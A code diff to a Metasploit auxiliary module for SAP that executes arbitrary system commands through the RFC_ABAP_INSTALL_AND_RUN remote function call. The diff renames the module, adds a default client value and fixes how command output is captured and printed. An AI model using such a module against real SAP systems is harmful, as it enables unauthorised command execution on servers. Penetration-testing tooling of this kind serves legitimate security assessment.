@@ -20,7 +20,7 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'SAP RFC Extract USR02 Hashes',
+      'Name'           => 'SAP RFC ABAP INSTALL AND RUN Command Execution',
       'Description'    => %q{
         This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call to execute arbitrary SYSTEM commands.
         RFC_ABAP_INSTALL_AND_RUN takes ABAP source lines and executes them. It is common for the the function to be disabled or access revoked in a production system. It is also deprecated.
@@ -28,7 +28,10 @@ class Metasploit4 < Msf::Auxiliary
       },
       'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
       'Author'         => [ 'nmonkee' ],
-      'License'        => BSD_LICENSE
+      'License'        => BSD_LICENSE,
+      'DefaultOptions' => {
+        'CLIENT' => "000"
+      }
     )
 
     register_options(
@@ -39,16 +42,14 @@ class Metasploit4 < Msf::Auxiliary
       ], self.class)
   end
 
-  def run_host(ip)
-    user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+  def run_host(rhost)
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
     command = datastore['CMD']
-    login(rhost, rport, client, user, pass) do |conn|
+    login(rhost, rport, client, datastore['USERNAME'], datastore['PASSWORD']) do |conn|
       begin
-        rfc_abap_install_and_run_cmd(conn, command)
+        data = rfc_abap_install_and_run_cmd(conn, command)
         print_good("#{rhost}:#{rport} [SAP] Executed #{command}")
         print(data)
       rescue NWError => e
